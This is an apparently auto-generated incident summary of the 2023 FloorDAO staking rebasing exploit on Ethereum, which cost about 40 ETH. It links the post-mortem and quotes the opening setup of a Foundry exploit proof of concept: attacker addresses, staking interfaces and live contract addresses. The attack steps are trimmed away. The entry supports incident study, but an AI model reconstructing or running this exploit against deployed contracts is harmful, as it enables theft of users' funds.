# [?] FloorDAO - Rebasing logic issue

## Summary
Severity: Unknown
Chain: Ethereum
Component: FloorDAO
Published: 2023-09-05
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/FloorDAO_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$40ETH
References:
- https://twitter.com/PeckShieldAlert/status/1698962105058361392
- https://medium.com/floordao/floor-post-mortem-incident-summary-september-5-2023-e054a2d5afa4

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo -- Total Lost : ~40 eth
// Attacker : https://etherscan.io/address/0x4453aed57c23a50d887a42ad0cd14ff1b819c750
// Attack Contract : https://etherscan.io/address/0x6ce5a85cff4c70591da82de5eb91c3fa38b40595
// Attacker Transaction : https://explorer.phalcon.xyz/tx/eth/0x1274b32d4dfacd2703ad032e8bd669a83f012dde9d27ed92e4e7da0387adafe4

// @Analysis
// https://twitter.com/PeckShieldAlert/status/1698962105058361392
// https://medium.com/floordao/floor-post-mortem-incident-summary-september-5-2023-e054a2d5afa4

interface IFloorStaking {
    function unstake(address _to, uint256 _amount, bool _trigger, bool _rebasing) external;
    function stake(address _to, uint256 _amount, bool _rebasing, bool _claim) external returns (uint256);
}

interface IsFloor is IERC20 {
    function circulatingSupply() external returns (uint256);
}

contract FloorStakingExploit is Test {
    IERC20 floor = IERC20(0xf59257E961883636290411c11ec5Ae622d19455e);
    IsFloor sFloor = IsFloor(0x164AFe96912099543BC2c48bb9358a095Db8e784);
    IERC20 gFloor = IERC20(0xb1Cc59Fc717b8D4783D41F952725177298B5619d);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    uint256 flashAmount;
    IFloorStaking staking = IFloorStaking(0x759c6De5bcA9ADE8A1a2719a31553c4B7DE02539);
    Uni_Pair_V3 floorUniPool = Uni_Pair_V3(0xB386c1d831eED803F5e8F274A59C91c4C22EEAc0);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-09/FloorDAO_exp.sol_
